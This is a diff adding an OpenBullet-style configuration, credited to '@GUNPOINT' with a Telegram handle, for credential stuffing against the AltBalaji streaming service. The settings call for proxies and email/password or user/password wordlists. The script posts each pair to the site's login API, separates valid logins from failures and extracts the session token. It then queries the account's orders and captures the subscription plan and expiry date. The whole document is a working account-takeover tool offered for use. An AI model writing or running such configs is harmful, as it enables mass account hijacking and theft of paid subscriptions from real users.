@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "AltBalaji @Gunpoint",
+  "SuggestedBots": 75,
+  "LastModified": "2019-04-27T20:54:23.7266974+05:30",
+  "AdditionalInfo": "@Gunpoin007 telegram",
+  "Author": "@GUNPOINT",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.cloud.altbalaji.com/accounts/login?domain=IN" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.altbalaji.com" 
+  HEADER "Referer: https://www.altbalaji.com/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"ok\",\"session" 
+  KEYCHAIN Failure OR 
+    KEY "Username and password do not match" 
+
+PARSE "<SOURCE>" LR "session_token\":\"" "\",\"account\"" -> VAR "token" 
+
+REQUEST GET "https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=12&order_status=ok" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.altbalaji.com" 
+  HEADER "Referer: https://www.altbalaji.com/my-account" 
+  HEADER "XSSESSION: <token>" 
+
+#Capture PARSE "<SOURCE>" LR "\",\"valid_to\":\"" "\",\"updated\":\"" -> CAP "Exprie_date" 
+
+#PLAN_Capture PARSE "<SOURCE>" LR "\":{\"default\":\"ALTBalaji" "\",\"en\":\"" -> CAP "PLAN" 
+
